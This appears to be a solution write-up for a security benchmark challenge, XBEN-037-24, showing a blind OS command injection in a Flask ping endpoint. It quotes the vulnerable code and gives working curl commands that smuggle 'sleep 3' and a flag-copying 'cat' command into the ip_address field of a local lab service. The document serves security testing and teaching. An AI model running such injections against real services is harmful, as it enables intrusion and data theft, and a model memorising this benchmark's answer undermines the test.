# XBEN-037-24 — Is There Anybody Out There? - Blind

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability class:** OS command injection (blind) in a `ping` utility endpoint.

## Summary

`app/app.py`'s `POST /ping` builds a shell command by directly string-concatenating unvalidated user input:

```python
ip_address = request.form['ip_address']
command = 'ping -c 2 ' + ip_address
stdout, stderr = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
```

Despite the code comment ("Filtered command injection"), there is no sanitization at all — any shell metacharacter (`;`, `&&`, `|`, backticks, …) in `ip_address` is passed straight to `/bin/sh -c`. The response only ever renders `"Host is reachable!"` / `"Host is unreachable!"` (derived from whether `" bytes from"` appears in the captured output) — raw command output is never shown to the client, making this **blind** command injection. This is enough to both (a) confirm injection via a timing side channel (`sleep N`) and (b) achieve full RCE.

Because the app is a Flask server that also serves its own `static/` directory, the most efficient way to exfiltrate the flag (rather than a slow per-character blind boolean oracle) is to use the blind RCE to copy the flag file into the app's own static folder, then simply fetch it back over HTTP.

## Exploit

```bash
# 1. Confirm blind command injection via a timing side channel
time curl -s -X POST http://localhost:51150/ping -d "ip_address=127.0.0.1; sleep 3" -o /dev/null
# (request takes ~4s instead of ~1s, confirming the injected `sleep 3` ran)

# 2. Use the injection to copy the flag into the app's own static directory
curl -s -X POST http://localhost:51150/ping \
  --data-urlencode "ip_address=127.0.0.1; cat /FLAG.txt > /app/static/leak.txt" -o /dev/null

# 3. Fetch the exfiltrated file directly
curl -s http://localhost:51150/static/leak.txt
```
